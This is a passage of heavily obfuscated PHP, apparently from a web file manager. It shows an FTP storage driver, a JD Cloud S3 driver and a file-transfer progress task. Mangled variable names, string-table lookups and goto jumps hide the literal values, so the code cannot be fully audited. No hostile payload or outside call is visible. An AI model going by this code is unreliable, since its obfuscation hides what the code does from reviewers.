copyFile($ÆÓÑ˜ĞŞ, $×€³¦ÍÛ) { if (!$this->_isconn()) { return !1; } $•ÏØÚ­æ = $this->pathThis($this->iconvSystem($ÆÓÑ˜ĞŞ)); $ú¸ÑáŞ« = $this->tempFile($•ÏØÚ­æ); $ü§›ºã£ = $this->iconvApp($ú¸ÑáŞ«); $this->download($ÆÓÑ˜ĞŞ, $ü§›ºã£); $ñŞÌéİÎ = $this->upload($×€³¦ÍÛ, $ü§›ºã£); $this->tempFileRemve($ú¸ÑáŞ«); return $ñŞÌéİÎ; } public function moveFile($Ê¹¨öô, $ô¡º‚ÍÉ) { if (!$this->_isconn()) { return !1; } $Ê¹¨öô = $this->iconvSystem($Ê¹¨öô); $ô¡º‚ÍÉ = $this->iconvSystem($ô¡º‚ÍÉ); $°§¢í = @ftp_rename($this->connect, $Ê¹¨öô, $ô¡º‚ÍÉ); if (!$°§¢í) { $this->writeLog(__FUNCTION__ . $_SERVER[¼’ç§¼´][1460], !0); return !1; } return $this->getPathOuter($ô¡º‚ÍÉ); } public function delFile($²‹õ™Õì) { if (!$this->_isconn()) { return !1; } $²‹õ™Õì = $this->iconvSystem($²‹õ™Õì); $”¡°ºëÜ = @ftp_delete($this->connect, $²‹õ™Õì); if (!$”¡°ºëÜ) { $this->writeLog(__FUNCTION__ . $_SERVER[¼’ç§¼´][1460], !0); } return $”¡°ºëÜ; } public function delFolder($öÈÚˆ×³) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $Öì£Ö²É = $˜åß¾Ÿ« = array(); $this->fileList($öÈÚˆ×³, $Öì£Ö²É, $˜åß¾Ÿ«, !0); $this->listItemCache = !0; foreach ($˜åß¾Ÿ« as $“öóÕäˆ) { $–îúğ†¡ = $this->iconvSystem($“öóÕäˆ[$_SERVER[¼’ç§¼´][32]]); $Ïë©Û¸Î = @ftp_delete($this->connect, $–îúğ†¡); if (!$Ïë©Û¸Î) { return !1; } } foreach ($Öì£Ö²É as $–îúğ†¡) { $–îúğ†¡ = $this->iconvSystem($–îúğ†¡); $Ïë©Û¸Î = @ftp_rmdir($this->connect, $–îúğ†¡); if (!$Ïë©Û¸Î) { return !1; } } $öÈÚˆ×³ = $this->iconvSystem($öÈÚˆ×³); return @ftp_rmdir($this->connect, $öÈÚˆ×³); } public function rename($«§Ç¥‚—, $÷¤·ÄÄÙ) { $Ã»ÎäÁê =& $_SERVER[¼’ç§¼´]; if (!$this->_isconn()) { return !1; } $öÌæú¤ = $this->fileNameAuto($this->pathFather($«§Ç¥‚—), $÷¤·ÄÄÙ); $öÌæú¤ = $this->iconvSystem($öÌæú¤); $«§Ç¥‚— = $this->iconvSystem($«§Ç¥‚—); $™Î÷úÈ§ = $this->pathFather($«§Ç¥‚—); $¦³è¸Ì¬ = rtrim($™Î÷úÈ§, $Ã»ÎäÁê[8]) . $Ã»ÎäÁê[8] . $öÌæú¤; $ÁˆÆ†âÙ = @ftp_rename($this->connect, $«§Ç¥‚—, $¦³è¸Ì¬); if (!$ÁˆÆ†âÙ) { $this->writeLog(__FUNCTION__ . $Ã»ÎäÁê[1460], !0); return !1; } $¦³è¸Ì¬ = $this->iconvApp($¦³è¸Ì¬); return $this->getPathOuter($¦³è¸Ì¬); } private function folderInfo($®àª–üÔ, $ş€ıúÍ = false) { $œ¶£¾Óµ =& $_SERVER[¼’ç§¼´]; $³ù²á¸Ë = array($œ¶£¾Óµ[32] => $this->pathThis($®àª–üÔ), $œ¶£¾Óµ[87] => $this->getPathOuter($œ¶£¾Óµ[8] . $®àª–üÔ), $œ¶£¾Óµ[33] => $œ¶£¾Óµ[78]); if ($ş€ıúÍ) { return $³ù²á¸Ë; } $³ù²á¸Ë[$œ¶£¾Óµ[233]] = $³ù²á¸Ë[$œ¶£¾Óµ[88]] = 0; $³ù²á¸Ë[$œ¶£¾Óµ[234]] = $³ù²á¸Ë[$œ¶£¾Óµ[235]] = !0; return $³ù²á¸Ë; } private function fileInfo($¢¬É‡©, $¼øİ±ŸÙ = false, $ÌÍ½¢¦ß = array()) { $²¤Æòñ =& $_SERVER[¼’ç§¼´]; $“•ª—œ“ = array($²¤Æòñ[32] => $this->pathThis($¢¬É‡©), $²¤Æòñ[87] => $this->getPathOuter($²¤Æòñ[8] . $¢¬É‡©), $²¤Æòñ[33] => $²¤Æòñ[232], $²¤Æòñ[79] => isset($ÌÍ½¢¦ß[$²¤Æòñ[79]]) ? $ÌÍ½¢¦ß[$²¤Æòñ[79]] : 0, $²¤Æòñ[169] => $this->ext($¢¬É‡©)); if ($¼øİ±ŸÙ) { return $“•ª—œ“; } $“•ª—œ“[$²¤Æòñ[233]] = $“•ª—œ“[$²¤Æòñ[88]] = 0; $“•ª—œ“[$²¤Æòñ[234]] = $“•ª—œ“[$²¤Æòñ[235]] = !0; $Ş‘Š²•¤ = $this->iconvSystem($¢¬É‡©); $“•ª—œ“[$²¤Æòñ[88]] = @ftp_mdtm($this->connect, $Ş‘Š²•¤); if (empty($ÌÍ½¢¦ß)) { $ÌÍ½¢¦ß = $this->objectMeta($¢¬É‡©); if (!$ÌÍ½¢¦ß) { return $“•ª—œ“; } } $“•ª—œ“[$²¤Æòñ[79]] = $ÌÍ½¢¦ß[$²¤Æòñ[79]]; return $“•ª—œ“; } public function size($‰ºŞ…¤Ç) { $Òƒé´ƒ× = $this->objectMeta($‰ºŞ…¤Ç); return $Òƒé´ƒ× ? $Òƒé´ƒ×[$_SERVER[¼’ç§¼´][79]] : 0; } public function info($áµ¹ÛÕº) { if ($this->isFile($áµ¹ÛÕº)) { return $this->fileInfo($áµ¹ÛÕº, 0); } else { if ($this->isFolder($áµ¹ÛÕº)) { return $this->folderInfo($áµ¹ÛÕº); } } return !1; } private function fileList($§ÍˆÙ€å, &$£ŞÊÉµÇ, &$ÜËöã³, $«ÁäÎ”Ø = false) { $¦‚Ş™¿ô =& $_SERVER[¼’ç§¼´]; $§ÍˆÙ€å = $this->iconvSystem($§ÍˆÙ€å); if (!$this->isFolder($§ÍˆÙ€å)) { return !1; } @ftp_chdir($this->connect, $¦‚Ş™¿ô[8]); $§ÍˆÙ€å = rtrim($§ÍˆÙ€å, $¦‚Ş™¿ô[8]) . $¦‚Ş™¿ô[8]; check_abort(); $²¦®š¶ = @ftp_rawlist($this->connect, $§ÍˆÙ€å); if (!$²¦®š¶) { $²¦®š¶ = array(); } $ó…„ì = array($¦‚Ş™¿ô[10] => 1, $¦‚Ş™¿ô[1372] => 1); foreach ($²¦®š¶ as $½ç´ÇÖ„) { $£ÍšœÃã = $this->_listItem($½ç´ÇÖ„); if ($£ÍšœÃã[0] == $¦‚Ş™¿ô[846]) { continue; } $“Ø˜à…‘ = $£ÍšœÃã[8]; if (empty($“Ø˜à…‘) && $“Ø˜à…‘ !== $¦‚Ş™¿ô[230] || isset($ó…„ì[$“Ø˜à…‘])) { continue; } $“Ø˜à…‘ = $this->iconvApp($§ÍˆÙ€å . ltrim($“Ø˜à…‘, $¦‚Ş™¿ô[8])); $µ¾‡Ûù¬ = array($¦‚Ş™¿ô[32] => $“Ø˜à…‘, $¦‚Ş™¿ô[33] => $¦‚Ş™¿ô[232], $¦‚Ş™¿ô[79] => $£ÍšœÃã[4]); if (substr($½ç´ÇÖ„, 0, 1) == $¦‚Ş™¿ô[1461]) { $µ¾‡Ûù¬[$¦‚Ş™¿ô[33]] = $¦‚Ş™¿ô[78]; $µ¾‡Ûù¬[$¦‚Ş™¿ô[79]] = 0; } $¼ß´•”† = $µ¾‡Ûù¬[$¦‚Ş™¿ô[33]] == $¦‚Ş™¿ô[78] ? !0 : !1; $this->cacheMethodInfoSet($“Ø˜à…‘, $¼ß´•”†, $µ¾‡Ûù¬); if ($¼ß´•”†) { $£ŞÊÉµÇ[] = $“Ø˜à…‘; if ($«ÁäÎ”Ø) { $this->fileList($“Ø˜à…‘, $£ŞÊÉµÇ, $ÜËöã³, $«ÁäÎ”Ø); } continue; } $ÜËöã³[] = $µ¾‡Ûù¬; } $this->cacheMethodInfoSet($§ÍˆÙ€å, !0); } private function _listItem($ìÄ‚ş†õ) { if (empty($ìÄ‚ş†õ)) { return array(); } $†à•ŒËŞ = preg_split($_SERVER[¼’ç§¼´][1462], $ìÄ‚ş†õ); if (count($†à•ŒËŞ) <= 9) { return $†à•ŒËŞ; } $†à•ŒËŞ[8] = trim(substr($ìÄ‚ş†õ, strpos($ìÄ‚ş†õ, $†à•ŒËŞ[7]) + strlen($†à•ŒËŞ[7]))); return array_splice($†à•ŒËŞ, 0, 9); } public function listPath($ã¶ĞÑ©Â, $Šîïˆ‘¦ = false) { $õ³¼‹Ì  =& $_SERVER[¼’ç§¼´]; if (!$this->_isconn()) { return !1; } $Áª²¼ô = $®Ã¥Ÿ¹ã = array(); $this->fileList($ã¶ĞÑ©Â, $Áª²¼ô, $®Ã¥Ÿ¹ã); foreach ($Áª²¼ô as $ÃàÏÔñ­ => $ıíÃƒÚø) { $Áª²¼ô[$ÃàÏÔñ­] = $this->folderInfo($ıíÃƒÚø, $Šîïˆ‘¦); } foreach ($®Ã¥Ÿ¹ã as $ÃàÏÔñ­ => $ıíÃƒÚø) { $®Ã¥Ÿ¹ã[$ÃàÏÔñ­] = $this->fileInfo($ıíÃƒÚø[$õ³¼‹Ì [32]], $Šîïˆ‘¦, $ıíÃƒÚø); } return array($õ³¼‹Ì [85] => $Áª²¼ô, $õ³¼‹Ì [86] => $®Ã¥Ÿ¹ã); } public function has($ü«àĞş, $ƒŠ–ÈÏĞ = false, $Ë©«á¿» = true) { $ÄÌÈ§å =& $_SERVER[¼’ç§¼´]; $ÛŞØ†îÖ = $Œ–ù¿å… = array(); $˜°¸¯ƒ½ = $ƒŠ–ÈÏĞ ? !0 : !1; $this->fileList($ü«àĞş, $ÛŞØ†îÖ, $Œ–ù¿å…, $˜°¸¯ƒ½); if ($ƒŠ–ÈÏĞ) { return array($ÄÌÈ§å[241] => count($Œ–ù¿å…), $ÄÌÈ§å[242] => count($ÛŞØ†îÖ)); } if ($Ë©«á¿») { if (count($Œ–ù¿å…)) { return !0; } } else { if (count($ÛŞØ†îÖ)) { return !0; } } return !1; } public function listAll($„ó„òÓ) { $‘ş¨ë¾¢ =& $_SERVER[¼’ç§¼´]; if (!$this->_isconn()) { return !1; } $ò–·²Ñë = $ì‘·øş­ = array(); $this->fileList($„ó„òÓ, $ò–·²Ñë, $ì‘·øş­, !0); $ÔÀ¤ˆ™Ö = array_to_keyvalue($ì‘·øş­, $‘ş¨ë¾¢[32]); foreach ($ò–·²Ñë as $†·¸í) { if (is_string($†·¸í)) { $ÔÀ¤ˆ™Ö[$†·¸í] = array($‘ş¨ë¾¢[79] => 0); } } return $this->listAllFiles($„ó„òÓ, $ÔÀ¤ˆ™Ö); } public function getContent($Š˜ƒéşã) { if (!$this->_isconn()) { return !1; } $Š˜ƒéşã = $this->iconvSystem($Š˜ƒéşã); return $this->fileSubstr($Š˜ƒéşã); } public function setContent($½­ºªü, $İ‰âĞğ” = '') { if (!$this->_isconn()) { return !1; } $½î¶Ëö» = $this->pathThis($this->iconvSystem($½­ºªü)); $å©¯¹Ê­ = $this->tempFile($½î¶Ëö»); file_put_contents($å©¯¹Ê­, $İ‰âĞğ”); $‹Åø§ = $this->upload($½­ºªü, $this->iconvApp($å©¯¹Ê­)); $this->tempFileRemve($å©¯¹Ê­); return $‹Åø§; } public function fileSubstr($„òı˜ÖÂ, $Ú‚˜³ = 0, $«æßàñ´ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($„òı˜ÖÂ, $Ú‚˜³, $«æßàñ´); } private function ftpRequest($È³Ó…, $Ü‘ àêå = 0, $¶ûáÁ×Š = false) { $È³Ó… = $this->iconvSystem($È³Ó…); $åÆÒÄÔƒ = $this->scheme . $this->host . $_SERVER[¼’ç§¼´][4] . $this->port; $ÁÙÁİŠ‡ = curl_init(); curl_setopt($ÁÙÁİŠ‡, CURLOPT_URL, $åÆÒÄÔƒ . $this->pathEncode($È³Ó…)); curl_setopt($ÁÙÁİŠ‡, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($¶ûáÁ×Š) { $²üü—º— = $Ü‘ àêå + $¶ûáÁ×Š - 1; curl_setopt($ÁÙÁİŠ‡, CURLOPT_RANGE, "{$Ü‘ àêå}\55{$²üü—º—}"); } curl_setopt($ÁÙÁİŠ‡, CURLOPT_RETURNTRANSFER, 1); $† ¸ñÜ = curl_exec($ÁÙÁİŠ‡); curl_close($ÁÙÁİŠ‡); return $† ¸ñÜ; } public function upload($•†°¨ª´, $ó±ŠËğ, $áĞÈ™Ü = false, $…–ˆ—±ò = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($•†°¨ª´))) { return !1; } $•†°¨ª´ = $this->iconvSystem($•†°¨ª´); $ó±ŠËğ = $this->iconvSystem($ó±ŠËğ); $Ò¢Õƒ±¦ = ftp_nb_put($this->connect, $•†°¨ª´, $ó±ŠËğ, FTP_BINARY); while ($Ò¢Õƒ±¦ == FTP_MOREDATA) { $Ò¢Õƒ±¦ = ftp_nb_continue($this->connect); } if ($Ò¢Õƒ±¦ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[¼’ç§¼´][1460], !0); return !1; } return $this->getPathOuter($•†°¨ª´); } public function download($Îäñûãñ, $¶†ë¼ë¢ = '') { if (!$this->_isconn()) { return !1; } $úÑ«Ù = $this->pathFather($¶†ë¼ë¢); if (!IO::mkdir($úÑ«Ù)) { return !1; } $Îäñûãñ = $this->iconvSystem($Îäñûãñ); $¶†ë¼ë¢ = $this->iconvSystem($¶†ë¼ë¢); $ú˜õó = ftp_nb_get($this->connect, $¶†ë¼ë¢, $Îäñûãñ, FTP_BINARY); while ($ú˜õó == FTP_MOREDATA) { $ú˜õó = ftp_nb_continue($this->connect); } if ($ú˜õó != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[¼’ç§¼´][1460], !0); return !1; } return $this->iconvApp($¶†ë¼ë¢); } public function exist($ºò¬–Î) { return $this->isFile($ºò¬–Î) || $this->isFolder($ºò¬–Î); } public function isFile($ˆ¹ëò˜Ö) { return !$this->isFolder($ˆ¹ëò˜Ö) && $this->objectMeta($ˆ¹ëò˜Ö); } public function isFolder($ü˜¸¶æ) { return $this->cacheMethod($_SERVER[¼’ç§¼´][179], $ü˜¸¶æ); } protected function objectMeta($ƒò“Ñá) { return $this->cacheMethod($_SERVER[¼’ç§¼´][181], $ƒò“Ñá); } protected function _objectMeta($Û‘æ—Ïá) { $¹§„¡Ëá =& $_SERVER[¼’ç§¼´]; if ($Û‘æ—Ïá == $¹§„¡Ëá[12] || $Û‘æ—Ïá == $¹§„¡Ëá[8]) { return array(); } if (!$this->_isconn()) { return !1; } $Û‘æ—Ïá = $this->iconvSystem($Û‘æ—Ïá); $€™¢Áñ¥ = array($¹§„¡Ëá[32] => $this->iconvApp($Û‘æ—Ïá), $¹§„¡Ëá[33] => $¹§„¡Ëá[232], $¹§„¡Ëá[79] => 0); @ftp_chdir($this->connect, $¹§„¡Ëá[8]); $ˆğıòßş = @ftp_size($this->connect, $Û‘æ—Ïá); if ($ˆğıòßş != -1) { $€™¢Áñ¥[$¹§„¡Ëá[79]] = $ˆğıòßş; } else { $À—ü¶É = @ftp_chdir($this->connect, $Û‘æ—Ïá); if (!$À—ü¶É) { return !1; } $€™¢Áñ¥[$¹§„¡Ëá[33]] = $¹§„¡Ëá[78]; } return $€™¢Áñ¥; } protected function _isFolder($€å¾•) { $²ËêÉ¾Š =& $_SERVER[¼’ç§¼´]; if ($€å¾• == $²ËêÉ¾Š[12] || $€å¾• == $²ËêÉ¾Š[8]) { return !0; } $î¸í¢åÄ = $this->_objectMeta($€å¾•); return isset($î¸í¢åÄ[$²ËêÉ¾Š[33]]) && $î¸í¢åÄ[$²ËêÉ¾Š[33]] == $²ËêÉ¾Š[78] ? !0 : !1; } } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($‹ŠêóÁŒ) { parent::__construct($‹ŠêóÁŒ); $this->setSignVersion($_SERVER[¼’ç§¼´][249]); } public function uploadLink($Š†­Õ÷ã, $Î›îøê = 0) { $”ÃØ­£¾ =& $_SERVER[¼’ç§¼´]; if ($this->isUploadServer()) { return; } $—©è = $this->getType(); if (!in_array($—©è, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $Œüä²øê = (!$Î›îøê ? 1 : ceil($Î›îøê / pow(1024, 3))) * 3600 * 4; $—¤×ôå = $this->uploadMultiData($Š†­Õ÷ã, $Œüä²øê); if ($—¤×ôå) { $—¤×ôå[$”ÃØ­£¾[97]] = $Š†­Õ÷ã; $—¤×ôå[$”ÃØ­£¾[98]] = $—©è; } return $—¤×ôå; } public function fileOutImage($ó‡‚øÂğ, $¥Òğàì± = 250) { if ($this->size($ó‡‚øÂğ) > 1024 * 1024 * 25) { return $this->fileOutImageServer($ó‡‚øÂğ, $¥Òğàì±); } $Øè“®ôº = $this->link($ó‡‚øÂğ); $Øè“®ôº .= $_SERVER[¼’ç§¼´][1463] . $¥Òğàì±; $this->fileOutLink($Øè“®ôº); } public function fileOutLink($– Ù¿•) { $¸…“ºˆô =& $_SERVER[¼’ç§¼´]; if (substr($– Ù¿•, 0, 7) == $¸…“ºˆô[218]) { $– Ù¿• = $¸…“ºˆô[219] . substr($– Ù¿•, 7); } header($¸…“ºˆô[175] . $– Ù¿•); die; } } goto D¿Š†¨ÕÅ¸; EÙ•ğ™Ÿ: class TaskFileTransfer extends Task { protected function startAfter() { $¯±€Şó =& $_SERVER[¼’ç§¼´]; $ú¯õ§Ï· =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($¯±€Şó[1814], array($this, $¯±€Şó[1815])); Hook::bind($¯±€Şó[1317], array($this, $¯±€Şó[1816])); Hook::bind($¯±€Şó[1817], array($this, $¯±€Şó[1818])); Hook::bind($¯±€Şó[682], array($this, $¯±€Şó[1819])); Hook::bind($¯±€Şó[683], array($this, $¯±€Şó[1820])); Hook::bind($¯±€Şó[689], array($this, $¯±€Şó[1821])); Hook::bind($¯±€Şó[690], array($this, $¯±€Şó[1822])); Hook::bind($¯±€Şó[685], array($this, $¯±€Şó[1823])); Hook::bind($¯±€Şó[687], array($this, $¯±€Şó[1824])); Hook::bind($¯±€Şó[651], array($this, $¯±€Şó[1825])); Hook::bind($¯±€Şó[648], array($this, $¯±€Şó[1825])); Hook::bind($¯±€Şó[653], array($this, $¯±€Şó[1825])); Hook::bind($¯±€Şó[655], array($this, $¯±€Şó[1825])); Hook::bind($¯±€Şó[657], array($this, $¯±€Şó[1825])); Hook::bind($¯±€Şó[1826], array($this, $¯±€Şó[1827])); Hook::bind($¯±€Şó[673], array($this, $¯±€Şó[1828])); $this->sourceModelCopyFlag = !1; Hook::bind($¯±€Şó[1829], array($this, $¯±€Şó[1830])); Hook::bind($¯±€Şó[1831], array($this, $¯±€Şó[1832])); Hook::bind($¯±€Şó[1833], array($this, $¯±€Şó[1834])); $ú¯õ§Ï·[$¯±€Şó[1835]] = LNG($¯±€Şó[1836]); $ú¯õ§Ï·[$¯±€Şó[1837]] = 0; $ú¯õ§Ï·[$¯±€Şó[1838]] = 0; $ú¯õ§Ï·[$¯±€Şó[1151]] = $¯±€Şó[12]; $ú¯õ§Ï·[$¯±€Şó[1839]] = $¯±€Şó[12]; $ú¯õ§Ï·[$¯±€Şó[1840]] = 0; $ú¯õ§Ï·[$¯±€Şó[1841]] = 0; $ú¯õ§Ï·[$¯±€Şó[1842]] = 0; if (!$ú¯õ§Ï·[$¯±€Şó[1671]]) { $ú¯õ§Ï·[$¯±€Şó[1671]] = LNG($¯±€Şó[1843]); } } protected function endAfter() { $ëÜ‰É„ =& $_SERVER[¼’ç§¼´]; Hook::unbind($ëÜ‰É„[1814], array($this, $ëÜ‰É„[1815])); Hook::unbind($ëÜ‰É„[1317], array($this, $ëÜ‰É„[1816])); Hook::unbind($ëÜ‰É„[1817], array($this, $ëÜ‰É„[1818])); Hook::unbind($ëÜ‰É„[682], array($this, $ëÜ‰É„[1819])); Hook::unbind($ëÜ‰É„[683], array($this, $ëÜ‰É„[1820])); Hook::unbind($ëÜ‰É„[689], array($this, $ëÜ‰É„[1821])); Hook::unbind($ëÜ‰É„[690], array($this, $ëÜ‰É„[1822])); Hook::unbind($ëÜ‰É„[685], array($this, $ëÜ‰É„[1823])); Hook::unbind($ëÜ‰É„[687], array($this, $ëÜ‰É„[1824])); Hook::unbind($ëÜ‰É„[651], array($this, $ëÜ‰É„[1825])); Hook::unbind($ëÜ‰É„[648], array($this, $ëÜ‰É„[1825])); Hook::unbind($ëÜ‰É„[653], array($this, $ëÜ‰É„[1825])); Hook::unbind($ëÜ‰É„[655], array($this, $ëÜ‰É„[1825])); Hook::unbind($ëÜ‰É„[657], array($this, $ëÜ‰É„[1825])); Hook::unbind($ëÜ‰É„[1826], array($this, $ëÜ‰É„[1827])); Hook::unbind($ëÜ‰É„[673], array($this, $ëÜ‰É„[1828])); Hook::unbind($ëÜ‰É„[1829], array($this, $ëÜ‰É„[1830])); Hook::unbind($ëÜ‰É„[1831], array($this, $ëÜ‰É„[1832])); Hook::unbind($ëÜ‰É„[1833], array($this, $ëÜ‰É„[1834])); } public function copyMoveStart($ÂØÊø¢Ì, $êéÜÛíá, $ò³¢Î¿á, $¤•ƒßòº) { $ò»°‹Öø =& $_SERVER[¼’ç§¼´]; self::log($ò»°‹Öø[1844] . $êéÜÛíá . $ò»°‹Öø[73] . $¤•ƒßòº); $¯‘Î¥³ = rtrim(TEMP_FILES, $ò»°‹Öø[8]); if (substr($êéÜÛíá, 0, strlen($¯‘Î¥³)) == $¯‘Î¥³) { return; } if (substr($¤•ƒßòº, 0, strlen($¯‘Î¥³)) == $¯‘Î¥³) { return; } $ã†ß´¥° =& $this->task; $ã†ß´¥°[$ò»°‹Öø[1845]] = KodIO::transferType($ÂØÊø¢Ì, $ò³¢Î¿á); $this->update(); } public function updateAfter() { $ÖêÄÕÏ‹ =& $_SERVER[¼’ç§¼´]; $ë•ÇÑûë =& $this->task; if (!$ë•ÇÑûë[$ÖêÄÕÏ‹[851]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($ë•ÇÑûë[$ÖêÄÕÏ‹[1845]] == $ÖêÄÕÏ‹[1411]) { return; } self::updateTask($ë•ÇÑûë); } private static function updateTask(&$‚Üà³ÛÒ) { $ÆôİŠÔÅ =& $_SERVER[¼’ç§¼´]; if ($‚Üà³ÛÒ[$ÆôİŠÔÅ[1845]] == $ÆôİŠÔÅ[1288] || $‚Üà³ÛÒ[$ÆôİŠÔÅ[1845]] == $ÆôİŠÔÅ[110]) { if ($‚Üà³ÛÒ[$ÆôİŠÔÅ[1839]]) { $‚Üà³ÛÒ[$ÆôİŠÔÅ[1842]] = $‚Üà³ÛÒ[$ÆôİŠÔÅ[1841]] + $‚Üà³ÛÒ[$ÆôİŠÔÅ[1838]]; } } else { if ($‚Üà³ÛÒ[$ÆôİŠÔÅ[1845]] == $ÆôİŠÔÅ[1412]) { if ($‚Üà³ÛÒ[$ÆôİŠÔÅ[1839]] == $ÆôİŠÔÅ[1288]) { $‚Üà³ÛÒ[$ÆôİŠÔÅ[1842]] = $‚Üà³ÛÒ[$ÆôİŠÔÅ[1841]] + $‚Üà³ÛÒ[$ÆôİŠÔÅ[1838]] * 0.5; } else { if ($‚Üà³ÛÒ[$ÆôİŠÔÅ[1839]] == $ÆôİŠÔÅ[110]) { $‚Üà³ÛÒ[$ÆôİŠÔÅ[1842]] = $‚Üà³ÛÒ[$ÆôİŠÔÅ[1841]] + $‚Üà³ÛÒ[$ÆôİŠÔÅ[1837]] * 0.5 + $‚Üà³ÛÒ[$ÆôİŠÔÅ[1838]] * 0.5; } } } } $‚Üà³ÛÒ[$ÆôİŠÔÅ[1785]] = $‚Üà³ÛÒ[$ÆôİŠÔÅ[1842]] / $‚Üà³ÛÒ[$ÆôİŠÔÅ[851]]; if ($‚Üà³ÛÒ[$ÆôİŠÔÅ[1785]] > 0) { $ñ×Õ·§š = timeFloat() - $‚Üà³ÛÒ[$ÆôİŠÔÅ[1787]] - $‚Üà³ÛÒ[$ÆôİŠÔÅ[1790]]; $‚Üà³ÛÒ[$ÆôİŠÔÅ[1791]] = $ñ×Õ·§š * (1 - $‚Üà³ÛÒ[$ÆôİŠÔÅ[1785]]) / $‚Üà³ÛÒ[$ÆôİŠÔÅ[1785]]; } } public function addPath($Ä¥´üÒ±) { $òÙõÔ° =& $_SERVER[¼’ç§¼´]; if (!$Ä¥´üÒ±) { return; } $š†¬ÜÙğ =& $this->task; $ÅÜ¢‰ö˜ = IO::infoWithChildren($Ä¥´üÒ±); $ö–ŸÈ¸³ = $š†¬ÜÙğ[$òÙõÔ°[1846]] ? $š†¬ÜÙğ[$òÙõÔ°[1846]][$òÙõÔ°[1847]] : 0; $š†¬ÜÙğ[$òÙõÔ°[1846]] = array($òÙõÔ°[1847] => $ö–ŸÈ¸³ + 1, $òÙõÔ°[505] => $ÅÜ¢‰ö˜[$òÙõÔ°[32]], $òÙõÔ°[87] => $ÅÜ¢‰ö˜[$òÙõÔ°[87]], $òÙõÔ°[593] => $ÅÜ¢‰ö˜[$òÙõÔ°[593]] ? $ÅÜ¢‰ö˜[$òÙõÔ°[593]] : $ÅÜ¢‰ö˜[$òÙõÔ°[87]]); if ($ÅÜ¢‰ö˜[$òÙõÔ°[33]] == $òÙõÔ°[232]) { $š†¬ÜÙğ[$òÙõÔ°[1149]] += 1; } else { $š†¬ÜÙğ[$òÙõÔ°[1149]] += $ÅÜ¢‰ö˜[$òÙõÔ°[82]][$òÙõÔ°[80]]; if ($ÅÜ¢‰ö˜[$òÙõÔ°[193]]) { $š†¬ÜÙğ[$òÙõÔ°[1149]] += $ÅÜ¢‰ö˜[$òÙõÔ°[82]][$òÙõÔ°[81]] + 1; } } $š†¬ÜÙğ[$òÙõÔ°[851]] += $ÅÜ¢‰ö˜[$òÙõÔ°[79]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($œ¯üğÊÒ) { } public function sourceAddHashEnd($×´ÀéÔŸ) { } public function sourceAddFileStart($Á—¦—¿ô) { $ÁØ±æú— =& $_SERVER[¼’ç§¼´]; $©Ö êşÈ =& $this->task; $©Ö êşÈ[$ÁØ±æú—[1837]] = $Á—¦—¿ô[$ÁØ±æú—[79]]; $©Ö êşÈ[$ÁØ±æú—[1835]] = $Á—¦—¿ô[$ÁØ±æú—[32]]; $©Ö êşÈ[$ÁØ±æú—[1151]] = $Á—¦—¿ô[$ÁØ±æú—[32]]; $©Ö êşÈ[$ÁØ±æú—[1848]] = $Á—¦—¿ô[$ÁØ±æú—[87]]; $this->update(); } public function sourceAddFileEnd($ú‰ùÊüä) { $ØÛöæÅù =& $_SERVER[¼’ç§¼´]; $İ´Ëšé… =& $this->task; $İ´Ëšé…[$ØÛöæÅù[1842]] += $ú‰ùÊüä[$ØÛöæÅù[79]]; $İ´Ëšé…[$ØÛöæÅù[1848]] = $ú‰ùÊüä[$ØÛöæÅù[87]]; $this->update(1); } public function copyFileStart($¾¬åõÄÚ, $Ïıòâ„è, $Ê•“Áúà, $·ƒ¿œÏ¨, $•ìÂõ‘Ÿ, $ÆÈñë) { $ÏßÓÒñì =& $_SERVER[¼’ç§¼´]; $¹˜Ú½§™ = $•ìÂõ‘Ÿ; if ($¹˜Ú½§™ == $GLOBALS[$ÏßÓÒñì[1849]]) { $¹˜Ú½§™ = $GLOBALS[$ÏßÓÒñì[1850]]; } $GLOBALS[$ÏßÓÒñì[1850]] = $•ìÂõ‘Ÿ; $GLOBALS[$ÏßÓÒñì[1849]] = $ÆÈñë; $’ßñ¿ú =& $this->task; $’ßñ¿ú[$ÏßÓÒñì[1835]] = $¹˜Ú½§™; $’ßñ¿ú[$ÏßÓÒñì[1837]] = (int) $¾¬åõÄÚ->size($Ïıòâ„è); $’ßñ¿ú[$ÏßÓÒñì[1838]] = 0; $’ßñ¿ú[$ÏßÓÒñì[1151]] = $ÏßÓÒñì[12]; $’ßñ¿ú[$ÏßÓÒñì[1839]] = $ÏßÓÒñì[12]; $’ßñ¿ú[$ÏßÓÒñì[1840]] = 0; $ºôü«ùİ = $’ßñ¿ú[$ÏßÓÒñì[1837]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($’ßñ¿ú[$ÏßÓÒñì[486]] . $ÏßÓÒñì[1851]); if ($ºôü«ùİ && file_exists(get_path_father($·ƒ¿œÏ¨))) { Cache::set($’ßñ¿ú[$ÏßÓÒñì[486]] . $ÏßÓÒñì[1851], $·ƒ¿œÏ¨); $’ßñ¿ú[$ÏßÓÒñì[1808]] = array($ÏßÓÒñì[1852], $ÏßÓÒñì[1853]); } $this->update(0, $ºôü«ùİ); } public static function updateCopyLocalFileSize($ëÀÃ ‡Î) { $·í¯í£ =& $_SERVER[¼’ç§¼´]; $ÎèŸú²Ì = Cache::get($ëÀÃ ‡Î[$·í¯í£[486]] . $·í¯í£[1851]); if (!$ÎèŸú²Ì || !file_exists($ÎèŸú²Ì)) { return $ëÀÃ ‡Î; } $ëÀÃ ‡Î[$·í¯í£[1838]] = @filesize($ÎèŸú²Ì); $ëÀÃ ‡Î[$·í¯í£[1842]] += $ëÀÃ ‡Î[$·í¯í£[1838]]; self::updateTask($ëÀÃ ‡Î); return $ëÀÃ ‡Î; } public function copyFileEnd($Éî¶Ÿòœ, $ˆ¯®¥ßÀ, $Ïİ˜äÛ…, $¶çÙ€”í, $œüØà“Ü, $üÛ°³£À) { $²öÔ¤İÅ =& 